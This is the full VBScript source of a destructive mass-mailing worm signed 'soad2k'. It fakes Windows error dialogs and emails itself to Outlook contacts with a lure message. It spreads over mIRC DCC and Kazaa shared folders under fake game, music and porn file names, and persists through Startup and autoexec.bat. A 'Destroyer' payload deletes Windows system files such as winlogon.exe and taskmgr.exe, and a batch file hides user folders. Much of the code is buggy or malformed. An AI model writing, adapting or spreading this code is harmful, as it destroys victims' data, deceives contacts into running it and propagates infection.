Dim MY_PROPERTY, fs, MY_Machine, fso, Dim Destroyer, scripting
Dim WshShell
Dim mail As Outlook.Application
Dim spread, ws, MyIRC, PfDir, IRC
Dim FsCopyer2

Msgbox "Windows cannot determine the file type. So this process will be terminated."

Set WshShell = WScript.CreateObject("WScript.Shell")
DesktopFolder = WshShell.SpecialFolders("Desktop")
Set FileShortcut = WshShell.CreateShortcut(DesktopFolder & "\Free games.lnk")
FileShortcut.TargetPath = WScript.ScriptFullName
FileShortcut.Description = "Free games!"
FileShortcut.WorkingDirectory = DesktopFolder
FileShortcut.Save

Set fs = createobject("scripting.filesystemobject")
Set st = createobject("wscript.shell")
Set FsCopyer2 = CreateObject("Scripting.FileSystemObject")
Set hide = fscopyer2.createtextfile("C:\hider.bat")
hide.writeline ("@echo off")
fscopyer.copyfile wscript.scriptfullname, "C:\movie.vbs"
fscopyer.copyfile wscript.scriptfullname, "C:\anime.vbs"

for i = 1 to 5
Set mail=CreateObject("Outlook.Application")
For x=1 To 50
Set Mail=mail.CreateItem(0)
Mail.To=mail.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="Sup man?"
Mail.Body="Sup man? nothing much here. just made this sweet animation thought. wana see? just download it."
Mail.Attachments.Add("C:\docume~1\AllUse~1\movie.vbs")
Mail.Send
Next
Set Mail = Nothing
mail.Quit
next

for i = 1 to 5
Set spread = CreateObject("scripting.filesystemobject")
Set ws = CreateObject("wscript.shell")
If IRC = "" Then
If Spread.FileExists("c:\mirc\mirc.ini") Then
IRC = "c:\mirc"
End If
If Spread.FileExists("c:\mirc32\mirc.ini") Then
IRC = "c:\mirc32"
End If
PfDir = ws.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If Spread.FileExists(PfDir & "\mirc\mirc.ini") Then
IRC = PfDir & "\mirc"
Set PfDir = Nothing
Set Spread = Nothing
End If
End If
If IRC <> "" Then
Set MyIRC = Fso.CreateTextFile(Path & "\script.ini", True)
MyIRC.writeline "[script]"
MyIRC.writeline "n0=on 1:JOIN:#:{"
MyIRC.writeline "n1= /if ( $nick == $me ) { halt }"
MyIRC.writeline "n2= /." & Chr(100) & Chr(99) & Chr(99) & " send $nick C:\anime.vbs"
MyIRC.writeline "n3=}"
MyIRC.Close
Set MyIRC = Nothing
Set IRC = Nothing
Set ws = Nothing
End If
next

Set reg = createobject("wscript.shell")
reg.regwrite "[HKEY_CLASSES_ROOT\CLSID\{5b4dae26-b807-11d0-9815-00c04fd91972}]"
reg.regwrite "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\
Explorer]"
reg.regwrite "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
Explorer]"
reg.regwrite "NoViewContextMenu"
reg.regwrite "REG_DWORD (DWORD Value)"
reg.regwrite "(0)"
reg.regwrite "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\
Explorer]"
reg.regwrite "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
Explorer]"
reg.regwrite "NoPropertiesMyComputer"
reg.regwrite "REG_DWORD (DWORD Value)"
reg.regwrite "(0)"
reg.regwrite "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\
NonEnum]"
reg.regwrite "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
NonEnum]"
reg.regwrite "{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
reg.regwrite "REG_DWORD (DWORD Value)"
reg.regwrite "(1)"

Randomize
for i = 1 to 25
a = int(rnd(1) * 6) + 1
Select Case a
Case 1
b = "C:\"
Case 2
b = "C:\progra~1\"
Case 3
b = "C:\docume~1\"
Case 4
b = "C:\DOCUME~1\ALLUSE~1\Desktop\"
Case 5
b = "C:\DOCUME~1\ALLUSE~1\STARTM~1\"
Case 6
b = "C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\"
End Select
c = rnd*rnd*a*a*rnd(1238218)*rnd(a)*a*a*a*rnd*999999
c = replace(c, ".", "")
d = b+c+".vbs"
fs.CopyFile Wscript.ScriptFullName, d
st.run d
hide.writeline ("Attrib +H ")&d
wscript.sleep 1000
Next

r = "C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\"
a2 = c*c*c*c*c*c*c*c*c*c*c*c*c*c*c
a2 = replace(a, ".", "")
a2 = r+a2+".bat"
Set fs = CreateObject("Scripting.FileSystemObject")
If FsCopyer2.FileExists ("C:\Progra~1\K.bat") = False Then
fs.copyfile ("C:\progra~1\k.bat")
End If
Set MY_PROPERTY = fs.CreateTextFile a2
MY_PROPERTY.WriteLine("rem created by soad2k!!")
MY_PROPERTY.WriteLine("rem this is the super spread bat that was dropped by a host vbs!")
MY_PROPERTY.WriteLine("color a")
MY_PROPERTY.WriteLine("echo and so it began!")
MY_PROPERTY.WriteLine("echo if exsist C:\ProgramFiles\KaZaA\mysharedfolder goto kazaabegin")
MY_PROPERTY.WriteLine("echo if not exsist goto md")
MY_PROPERTY.WriteLine(":md")
MY_PROPERTY.WriteLine("md C:\Progra~1\kazaa\mysharedfolder")
MY_PROPERTY.WriteLine("md C:\Progra~1\KaZaA\MySharedFolder\mymp3's")
MY_PROPERTY.WriteLine("md C:\Progra~1\kazaa\mysharedfolder\mympegs")
MY_PROPERTY.WriteLine("md C:\Progra~1\kazaa\mysharedfolder\myphotos")
MY_PROPERTY.WriteLine("goto kazaa")
MY_PROPERTY.WriteLine(":kazaabegin")
MY_PROPERTY.WriteLine("md C:\Progra~1\kazaa\mysharedfolder\mympegs")
MY_PROPERTY.WriteLine("md C:\Progra~1\KaZaA\MySharedFolder\mymp3's")
MY_PROPERTY.WriteLine("md C:\Progra~1\kazaa\mysharedfolder\myphotos")
MY_PROPERTY.WriteLine("goto kazaa")
MY_PROPERTY.WriteLine(":kazaa")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mymp3's\stupifybydisturbed.mp3")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mymp3's\testifybyratm.mp3")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mymp3's\fuckthesystembysoad.mp3")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mymp3's\digbymudvayne.mp3")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mymp3's\inervisionbysoad.mp3")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mymp3's\chickenstubysoad.mp3 ")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mympegs\mudvayne.mpeg")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mympegs\hillarious.mpeg")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mympegs\bizzaresex.mpeg")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mympegs\animalsex.mpeg")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mympegs\porn.mpeg")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\emulaters.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\snes.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\medalofhonor.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\metalgeardsolid2.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\matalgearsolidvrmissions.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\metalgearsolid.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\devilmaycry2.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\devilmaycry.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\ageofempiers.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\doom3.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\doom2.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\doom.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\wolfinstein.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\waverunner.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\gamecube.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\Xbox.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\ps1.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\ps2.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortalkombatdeadlyaliences.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortalkombat6.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortalkombat5.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortakombat4.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\genises.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\nintendo.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\gameboy.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\gamegear.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortalkombat.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortalkombat2.bat")
MY_PROPERTY.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\mortalkombat3.bat")
MY_PROPERTY.WriteLine("copy %0 C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\batch_dropped.bat")
MY_PROPERTY.WriteLine("copy %0 C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\sucesess.bat")
Set fs = Nothing
Set MY_PROPERTY = Nothing

a3 = cos(a2*a*a*a*a*a*c*c*c*c) * rnd() * a2
a3 = replace(a3, ".", "")
a3 = r+a3+".bat"
Set fso = CreateObject("Scripting.FileSystemObject")
Set MY_Machine = fso.CreateTextFile a3
MY_Machine.WriteLine("@echo off")
MY_Machine.Writeline(":start >>C:\autoexec.bat")
MY_Machine.Writeline("set /A detenation=detenation+1 >>C:\autoexec.bat")
MY_Machine.Writeline("if ""%detenation%""=="10" goto bye >>C:\autoexec.bat")
MY_Machine.WriteLine("Echo Bombing Machine >>C:\autoexec.bat")
MY_Machine.WriteLine("Echo by soad2k >>C:\autoexec.bat")
MY_Machine.WriteLine("Echo welcom to my Bombing Machine >>C:\autoexec.bat")
MY_Machine.WriteLine("MD C:\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random% >>C:\autoexec.bat")
MY_Machine.WriteLine("rem ************************************** >>C:\autoexec.bat")
MY_Machine.WriteLine("MD C:\winnt\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random% >>C:\autoexec.bat")
MY_Machine.WriteLine("rem ************************************** >>C:\autoexec.bat")
MY_Machine.WriteLine("MD C:\docume~1\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random% >>C:\autoexec.bat")
MY_Machine.WriteLine("rem ************************************** >>C:\autoexec.bat")
MY_Machine.WriteLine("MD C:\progra~1\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random%\%random% >>C:\autoexec.bat")
MY_Machine.WriteLine("rem ************************************** >>C:\autoexec.bat")
MY_Machine.WriteLine("Copy %0 C:\copy %0 DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\My_Machine.bat >>C:\autoexec.bat")
MY_Machine.WriteLine("copy %0 C:\Progra~1\Kazaa\MySharedFolder\My_Machine.bat >>C:\autoexec.bat")
MY_Machine.WriteLine("for %%a in (*.htt) do copy C:\Calm_Like_A_Bomb.vbs %%a >>C:\autoexec.bat")
MY_Machine.WriteLine("for %%a in (*.html) do copy C:\Calm_Like_A_Bomb.vbs %%a >>C:\autoexec.bat")
MY_Machine.WriteLine("for %%a in (*.js) do copy C:\Calm_Like_A_Bomb.vbs %%a >>C:\autoexec.bat")
MY_Machine.WriteLine("for %%a in (*.vbs) do copy C:\Calm_Like_A_Bomb.vbs %%a >>C:\autoexec.bat")
MY_Machine.WriteLine("for %%a in (*.asp) do copy C:\Calm_Like_A_Bomb.vbs %%a >>C:\autoexec.bat")
MY_Machine.WriteLine("MD C:\C%detenation% >>C:\autoexec.bat")
MY_Machine.WriteLine("Copy %0 C:\C%detination% >>C:\autoexec.bat")
MY_Machine.WriteLine("goto start")
MY_Machine.WriteLine(":bye >>C:\autoexec.bat")
MY_Machine.WriteLine("net share C:\movie.vbs >>C:\autoexec.bat")
MY_Machine.WriteLine("exit >>C:\autoexec.bat")

Set fso = Nothing
Set MY_Machine = Nothing
a4 = (a*c)*(a*a2)*(a*a2*a3)*rnd(23232*2313213)*c*c*c*c
a4 = replace(a4, ".", "")
a4 = r+a4+".vbs"
Set scripting = CreateObject("Scripting.FileSystemObject")
Set Destroyer = scripting.CreateTextFile a4
Destroyer.Writeline("'Destroyer")  
Destroyer.Writeline("' By")
Destroyer.Writeline("'  Soad2k")
Destroyer.Writeline("On Error Resume Next")
Destroyer.Writeline("Dim Boom")
Destroyer.Writeline("Set Boom = CreateObject(""Scripting.FileSystemObject"")")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system\*.*"", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\fonts\*.* "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\cursors\*.* "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\calc.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\cdplayer.exe ", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\dfrg.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\dxdiag.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\freecell.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\gpedit.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\graphics.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\grpconv.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\iexpress.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\jdbgmgr.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\lights.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\magnify.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\mplay32.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\mspaint.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\nararator.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\osk.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\perfmon.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\regedt32.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\rundl32.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\secpol.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\sysedit.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\telnet.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\winmine.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\winlogon.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\taskmgr.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\sndrec32.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\system32\sndvol32.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\winhelp.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\notepad.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\taskman.exe "", True")
Destroyer.Writeline("Boom.Deletefile ""C:\winnt\regedit.exe "", True")
Destroyer.Writeline("Set Boom = Nothing")

Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 10000
Set WshShell = Nothing

kazza = False
Do
If FsCopyer2.FolderExists ("C:\Progra~1\Kazaa\MySharedFolder\") Then
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\dog.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\bomber.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\sexy.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\hot.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\big gay all.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\non.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\awesoume.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\sisy.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\janet.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\lisa.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\web.vbs",True
FsCopyer2.CopyFile Wscript.ScriptFullName, "C:\Progra~1\Kazaa\MySharedFolder\mypropertystayout.vbs",True
s = "C:\Progra~1\Kazaa\MySharedFolder\"
For i = 1 To 50
 k = a*a4*a3*c*a*a4*a3*c*a*a4*a3*c*a*a4*a3*c*a*a4*a3*c*222222
 k = k*k*k*k*rnd*rnd*rnd(k)*cos(k)*rnd(1212312321214324*324324)
 k = replace(k, ".", "")
 t = s+k+".vbs"
 fscopyer2.copyfile t
Next
kazza = True
Else
Set st2 =createobject("wscript.shell")
st2.run ("C:\progra~1\k.bat")
End If
Loop until kazza = True
Set FsCopyer = Nothing

Randomize
for i = 1 to 500
a = int(rnd(1) * 6) + 1
Select Case a
Case 1
b = "C:\"
Case 2
b = "C:\progra~1\"
Case 3
b = "C:\docume~1\"
Case 4
b = "C:\DOCUME~1\ALLUSE~1\Desktop\"
Case 5
b = "C:\DOCUME~1\ALLUSE~1\STARTM~1\"
Case 6
b = "C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\"
End Select
c = rnd*rnd*a*a*rnd(1238218)*rnd(a)*a*a*a*rnd*999999
c = replace(c, ".", "")
d = b+c+".vbs"
fs.CopyFile Wscript.ScriptFullName, d
st.run d
hide.writeline ("Attrib +H ")&d
Next
hide.writeline ("Attrib +H C:\hide.bat")
hide.close
st.run "C:\hide.bat"
Dim writer,fso, ws
Set fso = createobject("scripting.filesystemobject")
Set writer = fso.createtextfile ("C:\Hider.bat")
writer.writeline ("@echo off")
writer.writeline ("rem The hider.bat By Soad2K")
writer.writeline ("Attrib +H C:\winnt")
writer.writeline ("Attrib +H C:\windows")
writer.writeline ("attrib +H C:\Docume~1\alluse~1\desktop\*.*")
writer.writeline ("attrib +H C:\Docume~1\alluse~1\desktop")
writer.writeline ("attrib +H C:\DOCUME~1\ALLUSE~1\STARTM~1\programs\ACCESS~1\*.*")
writer.writeline ("attrib +H C:\DOCUME~1\ALLUSE~1\STARTM~1\programs\ACCESS~1")
writer.writeline ("attrib +H C:\DOCUME~1\ALLUSE~1\STARTM~1\programs\*.*")
writer.writeline ("attrib +H C:\DOCUME~1\ALLUSE~1\STARTM~1\programs")
writer.writeline ("attrib +H C:\DOCUME~1\ALLUSE~1\STARTM~1\*.*")
writer.writeline ("attrib +H C:\DOCUME~1\ALLUSE~1\STARTM~1")
writer.writeline ("attrib +H C:\DOCUME~1\ALLUSE~1\*.*")
writer.writeline ("attrib +H C:\DOCUME~1\ALLUSE~1")
writer.writeline ("attrib +H C:\DOCUME~1\*.*")
writer.writeline ("attrib +H C:\DOCUME~1")
writer.writeline ("Attrib +H C:\DOCUME~1\alluse~1\MYDOCU~1\*.*")
writer.writeline ("Attrib +H C:\DOCUME~1\alluse~1\MYDOCU~1")
writer.close
msgbox "A Windows error has occured.", ,"Windows error 80732"
ws.run "C:\Hider.bat" 